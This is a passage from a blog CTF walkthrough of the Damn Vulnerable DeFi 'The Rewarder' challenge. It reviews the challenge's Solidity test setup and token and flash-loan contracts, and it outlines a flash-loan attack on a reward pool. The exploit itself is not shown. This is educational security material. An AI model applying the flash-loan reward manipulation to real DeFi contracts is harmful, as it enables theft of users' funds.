@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Vasiliy Yorkin">
+<meta name="description" content="Challenge Today we&rsquo;re going to take a look at The Rewarder challenge:
+There&rsquo;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don&rsquo;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet.">
+<meta name="keywords" content="Vasiliy Yorkin">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder"/>
+<meta name="twitter:description" content="Challenge Today we&rsquo;re going to take a look at The Rewarder challenge:
+There&rsquo;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don&rsquo;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet."/>
+
+<meta property="og:title" content="CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder" />
+<meta property="og:description" content="Challenge Today we&rsquo;re going to take a look at The Rewarder challenge:
+There&rsquo;s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don&rsquo;t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. Oh, by the way, rumours say a new pool has just landed on mainnet." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-17T00:33:00+03:00" />
+<meta property="article:modified_time" content="2022-08-17T00:33:00+03:00" />
+
+
+
+
+  <title>vyorkin.org</title>
+
+  
+  <link rel="canonical" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/">
+  
+
+  <link rel="preload" href="https://vyorkin.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.bce1ad3fd9463aca56f0ae393ff86fb2a0d51b58b56e32625fa4af028409f02d.css" integrity="sha256-vOGtP9lGOspW8K45P/hvsqDVG1i1bjJiX6SvAoQJ8C0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.e2e6584ce20683687b57e321b1116fbb5051e3534cc7846c9baccff833431b67.css" integrity="sha256-4uZYTOIGg2h7V&#43;MhsRFvu1BR41NMx4Rsm6zP&#43;DNDG2c=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="https://vyorkin.org/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://vyorkin.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://vyorkin.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://vyorkin.org/site.webmanifest">
+<link rel="mask-icon" href="https://vyorkin.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.101.0" />
+
+
+  
+
+</head>
+
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://vyorkin.org/">
+      vyorkin.org
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/about/">4b0u7</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="https://vyorkin.org/posts/">bl06</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/ru-ru/">ru</a>
+              </li>
+            
+          
+            
+              
+              <li class="navigation-item">
+                <a href="https://vyorkin.org/de-de/">de</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-5-the-rewarder/">
+              CTF walkthrough, Damn Vulnerable DeFi, #5 The rewarder
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-08-17T00:33:00&#43;03:00">
+                August 17, 2022
+              </time>
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="https://vyorkin.org/categories/blockchain/">blockchain</a>
+      <span class="separator">•</span>
+    <a href="https://vyorkin.org/categories/ctf/">ctf</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/blockchain/">blockchain</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/ctf/">ctf</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://vyorkin.org/tags/security/">security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h2 id="challenge">
+  Challenge
+  <a class="heading-link" href="#challenge">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Today we&rsquo;re going to take a look at
+<a href="https://www.damnvulnerabledefi.xyz/challenges/5.html">The
+Rewarder</a> challenge:</p>
+<blockquote class="quote2 quote2-question">There&rsquo;s a pool offering rewards in tokens every 5 days for those
+who deposit their DVT tokens into it. Alice, Bob, Charlie and
+David have already deposited some DVT tokens, and have won their
+rewards! You don&rsquo;t have any DVT tokens. But in the upcoming
+round, you must claim most rewards for yourself. Oh, by the way,
+rumours say a new pool has just landed on mainnet. Isn&rsquo;t it
+offering DVT tokens in flash loans?
+</blockquote>
+
+<h2 id="analysis">
+  Analysis
+  <a class="heading-link" href="#analysis">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>Let&rsquo;s explore the smart contracts! For this challenge we have 5 of them:</p>
+<ul>
+<li><code>DamnValuableToken</code> &ndash; The ERC20 token deposited into <code>TheRewarderPool</code> by users
+(DVT aka the &ldquo;liquidity token&rdquo;).</li>
+<li><code>AccouningToken</code> &ndash; The ERC20 named <code>rToken</code> (rTKN). Used for internal
+accounting and snapshots. Pegged \( 1:1 \) with the &ldquo;liquidity token&rdquo;
+(DVT).</li>
+<li><code>RewardToken</code> &ndash; The ERC20 token in which rewards are issued (RWT).</li>
+<li><code>TheRewarderPool</code> &ndash; The pool offering rewards every \( 5 \) days.</li>
+<li><code>FlashLoanerPool</code> &ndash; Another pool, which allows us to get a
+flash loan in DVT. Has \( 1000000 \) (1 million) DVT&rsquo;s in it.</li>
+</ul>
+<p>Now, let&rsquo;s review the setup code in <code>TheRewarder.t.sol</code> test contract.</p>
+<h3 id="setup">
+  SetUp
+  <a class="heading-link" href="#setup">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>There are 2 constants:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">constant</span> TOKENS_IN_LENDER_POOL = <span style="color:#ff0;font-weight:bold">1</span>_000_000e18;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">constant</span> USER_DEPOSIT = <span style="color:#ff0;font-weight:bold">100</span>e18;
+</span></span></code></pre></div><p>The first one is used to set initial token balance of the pool
+offering flash loans:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(flashLoanerPool), TOKENS_IN_LENDER_POOL);
+</span></span></code></pre></div><p>The second one is the amount of tokens each user deposits:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Each user gets 100 DVT&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    dvt.<span style="color:#fff;font-weight:bold">transfer</span>(users[i], USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Approve spending of 100 DVT and make a deposit
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    vm.startPrank(users[i]);
+</span></span><span style="display:flex;"><span>    dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(theRewarderPool), USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    theRewarderPool.deposit(USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Ensure that the pool&#39;s accounting token increased
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    assertEq(
+</span></span><span style="display:flex;"><span>        theRewarderPool.accToken().balanceOf(users[i]),
+</span></span><span style="display:flex;"><span>        USER_DEPOSIT
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Initially there are \( 400 \) accounting tokens minted (\( 100 \) tokens
+for each user) and no rewards distributed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * <span style="color:#ff0;font-weight:bold">4</span>);
+</span></span><span style="display:flex;"><span>assertEq(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span></code></pre></div><p>Then it advances the time \( 5 \) days (the
+minimum duration of round) so that depositors can get
+rewards:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">5</span> <span style="color:#fff;font-weight:bold">days</span>);
+</span></span></code></pre></div><p>And calls the <code>distributeRewards()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
+</span></span><span style="display:flex;"><span>    vm.prank(users[i]);
+</span></span><span style="display:flex;"><span>    theRewarderPool.distributeRewards(); <span style="color:#007f7f">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
+</span></span><span style="display:flex;"><span>    assertEq(theRewarderPool.rewardToken().balanceOf(users[i]), <span style="color:#ff0;font-weight:bold">25</span>e18);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>assertEq(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">100</span>e18);
+</span></span></code></pre></div><p>It asserts that:</p>
+<ul>
+<li>Each depositor gets \( 25 \) reward tokens (RWT).</li>
+<li>The are \( 4 × 25 = 100 \) reward tokens (RWT) emitted.</li>
+</ul>
+<p>It also cheks that we start with zero DVT tokens in balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(dvt.balanceOf(attacker), <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span></code></pre></div><p>And that the 2 rounds have occurred so far:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.roundNumber(), <span style="color:#ff0;font-weight:bold">2</span>);
+</span></span></code></pre></div><p>Next, let&rsquo;s go over the <code>validation()</code> function.</p>
+<h3 id="validation">
+  Validation
+  <a class="heading-link" href="#validation">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>It asserts that only one round have taken place:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.roundNumber(), <span style="color:#ff0;font-weight:bold">3</span>);
+</span></span></code></pre></div><p>Then it ensures that users get negligible rewards this round:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
+</span></span><span style="display:flex;"><span>    vm.prank(users[i]);
+</span></span><span style="display:flex;"><span>    theRewarderPool.distributeRewards();
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> delta = rewardPerUser - <span style="color:#ff0;font-weight:bold">25</span>e18;
+</span></span><span style="display:flex;"><span>    assertLt(delta, <span style="color:#ff0;font-weight:bold">1</span>e16);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>It calls the <code>distributeRewards()</code> for each user.</li>
+<li>Calculates the current round reward (<code>delta</code>).</li>
+<li>Asserts that it is less than \( 0.01 \) RWT.</li>
+</ul>
+<p>Finally, it checks that rewards have been issued:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertGt(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">100</span>e18);
+</span></span></code></pre></div><p>And that the amount of rewards earned by attacker is really
+close to \( 100 \) tokens:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> deltaAttacker = <span style="color:#ff0;font-weight:bold">100</span>e18 - rewardAttacker;
+</span></span><span style="display:flex;"><span>assertLt(deltaAttacker, <span style="color:#ff0;font-weight:bold">1</span>e17);
+</span></span></code></pre></div><p>The attacker finishes with zero DVT tokens in balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(dvt.balanceOf(attacker), <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span></code></pre></div><p>Let&rsquo;s take a look at the challenge contracts.</p>
+<h3 id="accountingtoken">
+  AccountingToken
+  <a class="heading-link" href="#accountingtoken">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>It inherits from the
+<a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a>
+and
+<a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl">AccessControl</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> AccountingToken <span style="color:#fff;font-weight:bold">is</span> ERC20Snapshot, AccessControl { ... }
+</span></span></code></pre></div><p>The <code>ERC20Snapshot</code> is an <code>ERC20</code> extension that lets you record
+the total supply and balance of an account at the specific point
+in time to retrieve later. The <code>AccessControl</code> contract allows
+to implement role-based access control. <code>AccountingToken</code> uses
+it to define 3 roles: minter, shapshot and burner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> MINTER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> SNAPSHOT_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;SNAPSHOT_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> BURNER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;BURNER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">constructor</span>() ERC20(<span style="color:#0ff;font-weight:bold">&#34;rToken&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;rTKN&#34;</span>) {
+</span></span><span style="display:flex;"><span>    _setupRole(DEFAULT_ADMIN_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>    _setupRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>    _setupRole(SNAPSHOT_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>    _setupRole(BURNER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It also has 3 corresponding external functions: <code>mint</code>,
+<code>snapshot</code> and <code>burn</code>.</p>
+<p>The <code>transfer</code> and <code>approve</code> functionality of ERC20 is
+&ldquo;disabled&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _transfer(<span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">pure</span> <span style="color:#fff;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">revert</span> NotImplemented();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _approve(<span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">pure</span> <span style="color:#fff;font-weight:bold">override</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">revert</span> NotImplemented();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="rewardtoken">
+  RewardToken
+  <a class="heading-link" href="#rewardtoken">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>Defines the minter role and the corresponding function to mint
+reward tokens. It gives that minter role only to the contract creator:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#007f7f">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> <span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">12</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {ERC20} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/token/ERC20/ERC20.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> {AccessControl} <span style="color:#fff;font-weight:bold">from</span> <span style="color:#0ff;font-weight:bold">&#34;openzeppelin-contracts/access/AccessControl.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @title RewardToken
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @dev A mintable ERC20 with 2 decimals to issue rewards
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> RewardToken <span style="color:#fff;font-weight:bold">is</span> ERC20, AccessControl {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> MINTER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    error Forbidden();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>() ERC20(<span style="color:#0ff;font-weight:bold">&#34;Reward Token&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;RWT&#34;</span>) {
+</span></span><span style="display:flex;"><span>        _setupRole(DEFAULT_ADMIN_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>        _setupRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> mint(<span style="color:#fff;font-weight:bold">address</span> to, <span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!hasRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>)) <span style="color:#fff;font-weight:bold">revert</span> Forbidden();
+</span></span><span style="display:flex;"><span>        _mint(to, amount);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="flashloanerpool">
+  FlashLoanerPool
+  <a class="heading-link" href="#flashloanerpool">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<p>Just a regular flash loan pool implementation we already
+familiar with. We can use it to borrow some DVT&rsquo;s by
+implementing the <code>receiveFlashLoan(uint256)</code> function in our
+<code>Exploit</code> contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> FlashLoanerPool <span style="color:#fff;font-weight:bold">is</span> ReentrancyGuard {
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">using</span> Address <span style="color:#fff;font-weight:bold">for</span> <span style="color:#fff;font-weight:bold">address</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DamnValuableToken <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">immutable</span> liquidityToken;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    error NotEnoughTokensInPool();
+</span></span><span style="display:flex;"><span>    error FlashLoanHasNotBeenPaidBack();
+</span></span><span style="display:flex;"><span>    error BorrowerMustBeAContract();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(<span style="color:#fff;font-weight:bold">address</span> liquidityTokenAddress) {
+</span></span><span style="display:flex;"><span>        liquidityToken = DamnValuableToken(liquidityTokenAddress);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> flashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> nonReentrant {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">uint256</span> balanceBefore = liquidityToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (amount &gt; balanceBefore) <span style="color:#fff;font-weight:bold">revert</span> NotEnoughTokensInPool();
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (!<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.isContract()) <span style="color:#fff;font-weight:bold">revert</span> BorrowerMustBeAContract();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        liquidityToken.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>, amount);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>.functionCall(
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">abi</span>.<span style="color:#fff;font-weight:bold">encodeWithSignature</span>(<span style="color:#0ff;font-weight:bold">&#34;receiveFlashLoan(uint256)&#34;</span>, amount)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (liquidityToken.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>)) &lt; balanceBefore)
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">revert</span> FlashLoanHasNotBeenPaidBack();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="therewarderpool">
+  TheRewarderPool
+  <a class="heading-link" href="#therewarderpool">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
